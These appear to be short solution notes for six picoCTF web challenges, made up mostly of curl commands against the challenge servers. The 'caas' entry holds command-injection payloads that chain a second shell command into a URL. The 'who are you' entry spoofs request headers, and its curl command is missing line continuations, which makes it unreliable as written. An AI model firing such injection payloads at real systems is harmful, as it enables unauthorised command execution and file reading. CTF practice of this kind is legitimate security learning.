## :robot: - where are the robots - `4`
```sh
$ curl http://jupiter.challenges.picoctf.org:36474/robots.txt
. . .
User-agent: *
Disallow: /_.html
. . .

$ curl http://jupiter.challenges.picoctf.org:36474/_.html
```

## :wood: - logon - `46`
- in chrome do `chrome://flags`
- set Partitioned cookies to enable
- relaunch and set admin cookie to true 

## :thread: - dont-use-client-side - `66`
```r
$ curl http://jupiter.challenges.picoctf.org:37821 | grep substring 
```

## :question: - who are you - `142`
```r
# HTTP Requests for Comments (RFC)
$ curl -H "user-agent: PicoBrowser" \
-H "referer: mercury.picoctf.net:34588" \
-H "date: 2018" 
-H "DNT: 1" \
-H "origin: sweden" \
-H "x-forwarded-for: 31.44.224.0" \
-H "accept-language: sv-swe"
http://mercury.picoctf.net:34588
```

## :baseball: - login - `200`
###### hint: base64

## :cow: - caas - `202`
```sh
$ curl "https://caas.mars.picoctf.net/cowsay/pwd;ls"
$ curl "https://caas.mars.picoctf.net/cowsay/xxx;cat f*"
```
